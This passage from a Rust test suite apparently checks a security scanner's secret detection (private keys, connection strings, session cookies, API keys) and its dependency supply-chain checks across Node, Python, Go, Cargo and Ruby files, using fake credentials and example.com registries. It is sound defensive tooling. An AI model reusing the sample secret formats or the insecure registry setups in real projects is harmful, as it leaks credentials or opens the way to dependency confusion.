            "\"private_key\": \"-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\\n-----END PRIVATE KEY-----\\n\"\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Private key assignment")));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_connection_strings_with_embedded_secrets() {
        let (context, root) = test_context(&[(
            "appsettings.Production.json",
            "\"ConnectionStrings__Primary\": \"Server=tcp:prod-sql.example.net;Database=wolfence;User ID=wolfence-app;Password=S3curePasswordValue123;Encrypt=true;\"\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Connection string with embedded secret")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_demo_documentation_credentials_and_code_assignments() {
        let (context, root) = test_context(&[(
            "docs/examples.md",
            "Example URL: https://user:password@example.com\nlet private_key_path = require_arg(&mut args, \"private key path\")?;\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings.is_empty(),
            "expected no secret findings, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_inline_cookie_session_secrets_but_ignores_benign_cookies() {
        let (context, root) = test_context(&[(
            "requests.http",
            "Cookie: theme=dark; sessionid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature\nSet-Cookie: auth_token=example-token; Path=/; HttpOnly\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert_eq!(
            findings
                .iter()
                .filter(|finding| finding.title.contains("Inline cookie or session secret"))
                .count(),
            1
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_secret_fixtures_inside_rust_test_modules() {
        let (context, root) = test_context(&[(
            "src/lib.rs",
            "#[cfg(test)]\nmod tests {\n    #[test]\n    fn fixture() {\n        let request = \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature\";\n        assert!(!request.is_empty());\n    }\n}\n",
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings.is_empty(),
            "expected no secret findings from rust test fixtures, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn generic_sast_patterns_ignore_rust_detector_source() {
        assert!(!generic_sast_pattern_applies_to_file(
            Path::new("src/core/scanners.rs"),
            "eval("
        ));
        assert!(generic_sast_pattern_applies_to_file(
            Path::new("web/app.ts"),
            "eval("
        ));
    }

    #[test]
    fn cargo_dependency_snapshot_ignores_package_metadata_only_changes() {
        let baseline = "[package]\nname = \"wolfence\"\nversion = \"0.1.0\"\n\n[dependencies]\nserde = \"1\"\n";
        let metadata_only_change = "[package]\nname = \"wolfence\"\ndefault-run = \"wolf\"\nversion = \"0.1.0\"\n\n[dependencies]\nserde = \"1\"\n";
        let dependency_change = "[package]\nname = \"wolfence\"\nversion = \"0.1.0\"\n\n[dependencies]\nserde = \"1\"\nserde_json = \"1\"\n";

        assert_eq!(
            cargo_dependency_snapshot(baseline),
            cargo_dependency_snapshot(metadata_only_change)
        );
        assert_ne!(
            cargo_dependency_snapshot(baseline),
            cargo_dependency_snapshot(dependency_change)
        );
    }

    #[test]
    fn rust_test_line_mask_marks_test_module_fixture_lines() {
        let mask = rust_test_line_mask(
            Path::new("src/lib.rs"),
            "#[cfg(test)]\nmod tests {\n    #[test]\n    fn fixture() {\n        let request = \"Authorization: Bearer token\";\n    }\n}\n",
        );

        assert!(mask[1]);
        assert!(mask[2]);
        assert!(mask[5]);
    }

    #[test]
    fn detects_high_entropy_secret_assignments_but_ignores_placeholders() {
        let fake_live_key = ["sk", "live", "1234567890abcdefghijklmno"].join("_");
        let (context, root) = test_context(&[(
            "app/.env.template",
            &format!("API_KEY=\"{fake_live_key}\"\nPLACEHOLDER_TOKEN=\"example-token\"\n"),
        )]);

        let findings = SecretScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Stripe live secret key")));
        assert!(!findings
            .iter()
            .any(|finding| finding.detail.contains("PLACEHOLDER_TOKEN")));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_cargo_git_dependencies() {
        let (context, root) = test_context(&[(
            "Cargo.toml",
            "[dependencies]\nserde = \"1\"\nprivate_dep = { git = \"https://github.com/example/private\", branch = \"main\" }\n",
        )]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| finding
            .title
            .contains("Cargo dependency uses a direct Git source")));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_node_lockfile_and_version_posture_issues() {
        let (context, root) = test_context(&[
            (
                "package.json",
                "{\n  \"dependencies\": {\n    \"left-pad\": \"latest\",\n    \"private-sdk\": \"git+https://github.com/example/private-sdk.git\"\n  }\n}\n",
            ),
            (
                "package-lock.json",
                "{\n  \"name\": \"demo\",\n  \"packages\": {\n    \"\": {\n      \"dependencies\": {\n        \"left-pad\": \"latest\"\n      }\n    }\n  },\n  \"resolved\": \"http://registry.example/pkg.tgz\"\n}\n",
            ),
        ]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("unbounded version selector")));
        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("insecure HTTP")));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn recognizes_yarn_lockfiles_and_detects_remote_resolution_issues() {
        let (context, root) = test_context(&[
            (
                "package.json",
                "{\n  \"dependencies\": {\n    \"left-pad\": \"latest\"\n  }\n}\n",
            ),
            (
                "yarn.lock",
                "left-pad@^1.3.0:\n  version \"1.3.0\"\n  resolved \"http://registry.example.com/left-pad/-/left-pad-1.3.0.tgz\"\n\n\"private-sdk@git+https://github.com/example/private-sdk.git\":\n  version \"1.0.0\"\n  resolved \"https://codeload.github.com/example/private-sdk/tar.gz/abcdef\"\n",
            ),
        ]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings
            .iter()
            .any(|finding| finding.id == "dependency.lockfile.missing.node"));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Yarn lockfile does not expose integrity hashes")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Yarn lockfile resolves a package over insecure HTTP")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Yarn lockfile contains a direct remote package source")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_dependency_confusion_posture_for_custom_node_registry_with_unscoped_packages() {
        let (context, root) = test_context(&[
            (".npmrc", "@internal:registry=https://packages.example.com/npm/\n"),
            (
                "package.json",
                "{\n  \"dependencies\": {\n    \"internal-sdk\": \"^1.2.3\",\n    \"@internal/platform\": \"^4.5.6\"\n  }\n}\n",
            ),
        ]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Custom Node registry config coexists with unscoped package names")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_allowlisted_internal_node_packages_for_custom_registry_posture() {
        let (mut context, root) = test_context(&[
            (".npmrc", "@internal:registry=https://packages.example.com/npm/\n"),
            (
                "package.json",
                "{\n  \"dependencies\": {\n    \"internal-sdk\": \"^1.2.3\",\n    \"@internal/platform\": \"^4.5.6\"\n  }\n}\n",
            ),
        ]);
        context.config.node_internal_packages = vec!["internal-sdk".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings.iter().any(|finding| {
            finding.id == "dependency.node.registry.ambiguous-package-ownership"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_prefix_allowlisted_internal_node_packages_for_custom_registry_posture() {
        let (mut context, root) = test_context(&[
            (".npmrc", "@internal:registry=https://packages.example.com/npm/\n"),
            (
                "package.json",
                "{\n  \"dependencies\": {\n    \"platform-auth\": \"^1.2.3\",\n    \"platform-ui\": \"^4.5.6\"\n  }\n}\n",
            ),
        ]);
        context.config.node_internal_package_prefixes = vec!["platform-".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings.iter().any(|finding| {
            finding.id == "dependency.node.registry.ambiguous-package-ownership"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_node_registry_owner_host_mismatches() {
        let (mut context, root) = test_context(&[
            (
                ".npmrc",
                "@internal:registry=https://mirror.example.com/npm/\n",
            ),
            (
                "package.json",
                "{\n  \"dependencies\": {\n    \"platform-auth\": \"^1.2.3\"\n  }\n}\n",
            ),
        ]);
        context.config.node_registry_ownership =
            vec!["packages.example.com=platform-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.node.registry.ownership-host-mismatch"
                && finding.detail.contains("packages.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_node_lockfile_owner_host_mismatches() {
        let (mut context, root) = test_context(&[
            (
                ".npmrc",
                "@internal:registry=https://packages.example.com/npm/\n",
            ),
            (
                "package-lock.json",
                "{\n  \"packages\": {\n    \"node_modules/platform-auth\": {\n      \"version\": \"1.2.3\",\n      \"resolved\": \"https://mirror.example.com/platform-auth/-/platform-auth-1.2.3.tgz\"\n    }\n  }\n}\n",
            ),
        ]);
        context.config.node_registry_ownership =
            vec!["packages.example.com=platform-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.node.lockfile.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn accepts_node_lockfile_when_resolved_host_matches_owner_rule() {
        let (mut context, root) = test_context(&[
            (
                ".npmrc",
                "@internal:registry=https://packages.example.com/npm/\n",
            ),
            (
                "package-lock.json",
                "{\n  \"packages\": {\n    \"node_modules/platform-auth\": {\n      \"version\": \"1.2.3\",\n      \"resolved\": \"https://packages.example.com/platform-auth/-/platform-auth-1.2.3.tgz\"\n    }\n  }\n}\n",
            ),
        ]);
        context.config.node_registry_ownership =
            vec!["packages.example.com=platform-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings
            .iter()
            .any(|finding| finding.id == "dependency.node.lockfile.ownership-host-mismatch"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_node_manifest_direct_source_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "package.json",
            "{\n  \"dependencies\": {\n    \"platform-auth\": \"https://mirror.example.com/platform-auth-1.2.3.tgz\"\n  }\n}\n",
        )]);
        context.config.node_registry_ownership =
            vec!["packages.example.com=platform-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.node.manifest.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_node_manifest_direct_source_owner_bypass_on_expected_host() {
        let (mut context, root) = test_context(&[(
            "package.json",
            "{\n  \"dependencies\": {\n    \"platform-auth\": \"https://packages.example.com/platform-auth-1.2.3.tgz\"\n  }\n}\n",
        )]);
        context.config.node_registry_ownership =
            vec!["packages.example.com=platform-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.node.manifest.direct-source-owner-bypass"
                && finding.detail.contains("packages.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pnpm_lock_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "pnpm-lock.yaml",
            "packages:\n  /platform-auth@1.2.3:\n    resolution:\n      tarball: https://mirror.example.com/platform-auth/-/platform-auth-1.2.3.tgz\n",
        )]);
        context.config.node_registry_ownership =
            vec!["packages.example.com=platform-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.node.lockfile.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn accepts_node_registry_owner_host_when_matching_registry_is_configured() {
        let (mut context, root) = test_context(&[
            (
                ".npmrc",
                "@internal:registry=https://packages.example.com/npm/\n",
            ),
            (
                "package.json",
                "{\n  \"dependencies\": {\n    \"platform-auth\": \"^1.2.3\"\n  }\n}\n",
            ),
        ]);
        context.config.node_registry_ownership =
            vec!["packages.example.com=platform-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings.iter().any(|finding| {
            finding.id == "dependency.node.registry.ownership-host-mismatch"
                || finding.id == "dependency.node.registry.ambiguous-package-ownership"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_custom_node_registry_when_packages_are_scoped_or_direct() {
        let (context, root) = test_context(&[
            (".npmrc", "@internal:registry=https://packages.example.com/npm/\n"),
            (
                "package.json",
                "{\n  \"dependencies\": {\n    \"@internal/platform\": \"^4.5.6\",\n    \"private-sdk\": \"git+https://github.com/example/private-sdk.git\"\n  }\n}\n",
            ),
        ]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings.iter().any(|finding| {
            finding
                .title
                .contains("Custom Node registry config coexists with unscoped package names")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_node_registry_config_posture() {
        let (context, root) = test_context(&[
            (
                ".npmrc",
                "registry=http://registry.example.com/\n@internal:registry=https://packages.example.com/npm/\nstrict-ssl=false\n",
            ),
            (
                ".yarnrc.yml",
                "npmRegistryServer: \"https://packages.example.com/npm/\"\nenableStrictSsl: false\nunsafeHttpWhitelist:\n  - packages.example.com\n",
            ),
        ]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Node registry config uses insecure HTTP transport")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Node registry config defines a non-default package source")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Node registry config disables TLS verification")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Yarn config defines a non-default package source")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Yarn config disables TLS verification")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Yarn config allows insecure HTTP package hosts")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_dependency_confusion_posture_for_custom_python_indexes() {
        let (context, root) = test_context(&[(
            "requirements.txt",
            "--extra-index-url https://packages.example.com/simple\ninternal-sdk==1.2.3\nrequests==2.32.0\n",
        )]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.title.contains(
                "Python package index override coexists with unqualified requirement names",
            )
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_allowlisted_internal_python_packages_for_custom_index_posture() {
        let (mut context, root) = test_context(&[(
            "requirements.txt",
            "--extra-index-url https://packages.example.com/simple\ninternal-sdk==1.2.3\n",
        )]);
        context.config.python_internal_packages = vec!["internal-sdk".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings.iter().any(|finding| {
            finding.id == "dependency.python.index.ambiguous-package-ownership"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_prefix_allowlisted_internal_python_packages_for_custom_index_posture() {
        let (mut context, root) = test_context(&[(
            "requirements.txt",
            "--extra-index-url https://packages.example.com/simple\ncorp-utils-api==1.2.3\ncorp-utils-cli==1.2.4\n",
        )]);
        context.config.python_internal_package_prefixes = vec!["corp-utils-".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings.iter().any(|finding| {
            finding.id == "dependency.python.index.ambiguous-package-ownership"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_python_index_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "requirements.txt",
            "--extra-index-url https://mirror.example.com/simple\ncorp-utils-api==1.2.3\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.index.ownership-host-mismatch"
                && finding.detail.contains("packages.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_uv_lock_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "uv.lock",
            "[[package]]\nname = \"corp-utils-api\"\nversion = \"1.2.3\"\nsource = { registry = \"https://mirror.example.com/simple\" }\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.lockfile.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_uv_lock_direct_source_owner_bypass() {
        let (mut context, root) = test_context(&[(
            "uv.lock",
            "[[package]]\nname = \"corp-utils-api\"\nversion = \"1.2.3\"\nsource = { editable = \"../corp-utils-api\" }\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.lockfile.direct-source-owner-bypass"
                && finding.detail.contains("editable source")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pipfile_lock_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "Pipfile.lock",
            "{\n  \"_meta\": {\n    \"sources\": [\n      {\"name\": \"internal\", \"url\": \"https://mirror.example.com/simple\", \"verify_ssl\": true}\n    ]\n  },\n  \"default\": {\n    \"corp-utils-api\": {\n      \"version\": \"==1.2.3\",\n      \"index\": \"internal\"\n    }\n  },\n  \"develop\": {}\n}\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.lockfile.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pipfile_lock_direct_source_owner_bypass() {
        let (mut context, root) = test_context(&[(
            "Pipfile.lock",
            "{\n  \"default\": {\n    \"corp-utils-api\": {\n      \"git\": \"https://github.com/example/corp-utils-api.git\",\n      \"ref\": \"abcdef1234567890\"\n    }\n  },\n  \"develop\": {}\n}\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.lockfile.direct-source-owner-bypass"
                && finding.detail.contains("Git source")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_poetry_lock_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "poetry.lock",
            "[[package]]\nname = \"corp-utils-api\"\nversion = \"1.2.3\"\n[package.source]\ntype = \"legacy\"\nurl = \"https://mirror.example.com/simple\"\nreference = \"internal\"\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.lockfile.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_poetry_lock_direct_source_owner_bypass() {
        let (mut context, root) = test_context(&[(
            "poetry.lock",
            "[[package]]\nname = \"corp-utils-api\"\nversion = \"1.2.3\"\n[package.source]\ntype = \"git\"\nurl = \"https://github.com/example/corp-utils-api.git\"\nreference = \"main\"\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.lockfile.direct-source-owner-bypass"
                && finding.detail.contains("Poetry git source")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_python_manifest_direct_source_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "requirements.txt",
            "corp-utils-api @ https://mirror.example.com/corp-utils-api-1.2.3.tar.gz\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.manifest.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_python_manifest_direct_source_owner_bypass_on_expected_host() {
        let (mut context, root) = test_context(&[(
            "requirements.txt",
            "corp-utils-api @ https://packages.example.com/corp-utils-api-1.2.3.tar.gz\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.manifest.direct-source-owner-bypass"
                && finding.detail.contains("packages.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pyproject_inline_table_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "pyproject.toml",
            "[tool.poetry.dependencies]\ncorp-utils-api = { url = \"https://mirror.example.com/corp-utils-api-1.2.3.tar.gz\" }\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.manifest.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pyproject_inline_table_owner_bypass_on_expected_host() {
        let (mut context, root) = test_context(&[(
            "pyproject.toml",
            "[tool.poetry.dependencies]\ncorp-utils-api = { url = \"https://packages.example.com/corp-utils-api-1.2.3.tar.gz\" }\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.manifest.direct-source-owner-bypass"
                && finding.detail.contains("packages.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pipfile_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "Pipfile",
            "[packages]\ncorp-utils-api = { file = \"https://mirror.example.com/corp-utils-api-1.2.3.tar.gz\" }\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.manifest.ownership-host-mismatch"
                && finding.detail.contains("mirror.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pipfile_owner_bypass_on_expected_host() {
        let (mut context, root) = test_context(&[(
            "Pipfile",
            "[packages]\ncorp-utils-api = { file = \"https://packages.example.com/corp-utils-api-1.2.3.tar.gz\" }\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding.id == "dependency.python.manifest.direct-source-owner-bypass"
                && finding.detail.contains("packages.example.com")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn accepts_python_index_owner_host_when_matching_index_is_configured() {
        let (mut context, root) = test_context(&[(
            "requirements.txt",
            "--extra-index-url https://packages.example.com/simple\ncorp-utils-api==1.2.3\n",
        )]);
        context.config.python_index_ownership =
            vec!["packages.example.com=corp-utils-*".to_string()];

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings.iter().any(|finding| {
            finding.id == "dependency.python.index.ownership-host-mismatch"
                || finding.id == "dependency.python.index.ambiguous-package-ownership"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_go_dependency_posture_and_exact_versions() {
        let (context, root) = test_context(&[
            (
                "go.mod",
                "module example.com/demo\n\ngo 1.22\n\nrequire github.com/google/uuid v1.6.0\nreplace example.com/private => ../private\nreplace example.com/insecure => http://mirror.example.com/private\n",
            ),
            (
                "go.sum",
                "github.com/google/uuid v1.6.0 h1:abc123=\ngithub.com/google/uuid v1.6.0/go.mod h1:def456=\n",
            ),
        ]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings
            .iter()
            .any(|finding| finding.id == "dependency.lockfile.missing.go"));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("go.mod contains a module replacement directive")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("go.mod replacement uses a local path source")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("go.mod replacement uses insecure HTTP transport")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_missing_go_lockfile_when_dependency_snapshot_changes() {
        let (context, root) = test_context(&[(
            "go.mod",
            "module example.com/demo\n\ngo 1.22\n\nrequire github.com/google/uuid v1.6.0\n",
        )]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "dependency.lockfile.missing.go"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_cargo_registry_config_posture() {
        let (context, root) = test_context(&[(
            ".cargo/config.toml",
            "[source.crates-io]\nreplace-with = \"internal\"\n\n[source.internal]\nregistry = \"sparse+http://packages.example.com/index/\"\n\n[registries.partner]\nindex = \"https://packages.partner.example.com/index/\"\n",
        )]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Cargo source config replaces the default registry")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Cargo source config uses insecure HTTP transport")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Cargo config defines a non-default registry source")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_ruby_dependency_sources_and_lockfile_posture() {
        let (context, root) = test_context(&[
            (
                "Gemfile",
                "source \"https://rubygems.org\"\nsource \"https://gems.example.com\"\ngit_source(:internal) { |repo| \"https://git.example.com/#{repo}.git\" }\ngem \"rails\", \"7.1.3\"\ngem \"private-sdk\", git: \"https://github.com/example/private-sdk.git\"\ngem \"local-sdk\", path: \"../local-sdk\"\n",
            ),
            (
                "Gemfile.lock",
                "GEM\n  remote: https://gems.example.com/\n  specs:\n    rails (7.1.3)\n\nGIT\n  remote: https://github.com/example/private-sdk.git\n  revision: abcdef1234567890\n  specs:\n    private-sdk (1.0.0)\n\nPATH\n  remote: ../local-sdk\n  specs:\n    local-sdk (0.1.0)\n",
            ),
        ]);

        let findings = DependencyScanner
            .scan(&context)
            .expect("scan should succeed");

        assert!(!findings
            .iter()
            .any(|finding| finding.id == "dependency.lockfile.missing.ruby"));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Gemfile defines a non-default gem source")
        }));
        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("Gemfile uses a direct Git source") }));
        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("Gemfile uses a local path source") }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Gemfile.lock references a non-default gem source")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Gemfile.lock contains a Git-sourced dependency")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Gemfile.lock contains a local path dependency")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_ruby_manifest_owner_host_mismatches() {
        let (mut context, root) = test_context(&[(
            "Gemfile",
